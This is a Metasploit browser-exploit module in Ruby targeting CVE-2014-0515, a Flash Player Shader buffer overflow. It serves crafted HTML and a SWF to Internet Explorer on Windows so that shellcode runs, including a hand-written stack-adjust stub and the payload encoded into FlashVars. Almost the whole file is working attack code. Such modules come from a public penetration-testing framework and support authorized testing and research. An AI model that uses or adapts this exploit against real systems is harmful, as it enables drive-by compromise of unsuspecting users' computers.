##
# This module requires Metasploit: http//metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core'

class Metasploit3 < Msf::Exploit::Remote
  Rank = NormalRanking

  include Msf::Exploit::Remote::BrowserExploitServer

  def initialize(info={})
    super(update_info(info,
      'Name'           => "Adobe Flash Player Shader Buffer Overflow",
      'Description'    => %q{
        This module exploits a buffer overflow vulnerability in Adobe Flash Player. The
        vulnerability occurs in the flash.Display.Shader class, when setting specially
        crafted data as its bytecode, as exploited in the wild in April 2014. This module
        has been tested successfully on IE 6 to IE 10 with Flash 11 and Flash 12 over
        Windows XP SP3, Windows 7 SP1 and Windows 8.
      },
      'License'        => MSF_LICENSE,
      'Author'         =>
        [
          'Unknown', # Vulnerability discovery and exploit in the wild
          'juan vazquez' # msf module
        ],
      'References'     =>
        [
          ['CVE', '2014-0515'],
          ['BID', '67092'],
          ['URL', 'http://helpx.adobe.com/security/products/flash-player/apsb14-13.html'],
          ['URL', 'http://www.securelist.com/en/blog/8212/New_Flash_Player_0_day_CVE_2014_0515_used_in_watering_hole_attacks'],
          ['URL', 'http://blog.trendmicro.com/trendlabs-security-intelligence/analyzing-cve-2014-0515-the-recent-flash-zero-day/' ]
        ],
      'Payload'        =>
        {
          'Space' => 2000,
          'DisableNops' => true,
          'PrependEncoder' => stack_adjust
        },
      'DefaultOptions'  =>
        {
          'InitialAutoRunScript' => 'migrate -f',
          'Retries'              => false,
          'EXITFUNC'             => "thread"
        },
      'Platform'       => 'win',
      'BrowserRequirements' =>
        {
          :source  => /script|headers/i,
          :clsid   => "{D27CDB6E-AE6D-11cf-96B8-444553540000}",
          :method  => "LoadMovie",
          :os_name => Msf::OperatingSystems::WINDOWS,
          :ua_name => Msf::HttpClients::IE,
          :flash   => lambda { |ver| ver =~ /^11\./ || ver =~ /^12\./ || (ver =~ /^13\./ && ver <= '13.0.0.182') }
        },
      'Targets'        =>
        [
          [ 'Automatic', {} ]
        ],
      'Privileged'     => false,
      'DisclosureDate' => "Apr 28 2014",
      'DefaultTarget'  => 0))
  end

  def exploit
    @swf = create_swf
    super
  end

  def stack_adjust
    adjust = "\x64\xa1\x18\x00\x00\x00"  # mov eax, fs:[0x18 # get teb
    adjust << "\x83\xC0\x08"             # add eax, byte 8 # get pointer to stacklimit
    adjust << "\x8b\x20"                 # mov esp, [eax] # put esp at stacklimit
    adjust << "\x81\xC4\x30\xF8\xFF\xFF" # add esp, -2000 # plus a little offset

    adjust
  end

  def on_request_exploit(cli, request, target_info)
    print_status("Request: #{request.uri}")

    if request.uri =~ /\.swf$/
      print_status("Sending SWF...")
      send_response(cli, @swf, {'Content-Type'=>'application/x-shockwave-flash', 'Pragma' => 'no-cache'})
      return
    end

    print_status("Sending HTML...")
    tag = retrieve_tag(cli, request)
    profile = get_profile(tag)
    profile[:tried] = false unless profile.nil? # to allow request the swf
    send_exploit_html(cli, exploit_template(cli, target_info), {'Pragma' => 'no-cache'})
  end

  def exploit_template(cli, target_info)
    swf_random = "#{rand_text_alpha(4 + rand(3))}.swf"
    flash_payload = ""
    get_payload(cli,target_info).unpack("V*").each do |i|
      flash_payload << "0x#{i.to_s(16)},"
    end
    flash_payload.gsub!(/,$/, "")


    html_template = %Q|<html>
    <body>
    <object classid="clsid:d27cdb6e-ae6d-11cf-96b8-444553540000" codebase="http://download.macromedia.com/pub/shockwave/cabs/flash/swflash.cab" width="1" height="1" />
    <param name="movie" value="<%=swf_random%>" />
    <param name="allowScriptAccess" value="always" />
    <param name="FlashVars" value="sh=<%=flash_payload%>" />
    <param name="Play" value="true" />
    </object>
    </body>
    </html>
    |

    return html_template, binding()
  end

  def create_swf
    path = ::File.join( Msf::Config.data_directory, "exploits", "CVE-2014-0515", "Graph.swf" )
    swf =  ::File.open(path, 'rb') { |f| swf = f.read }

    swf
  end

end
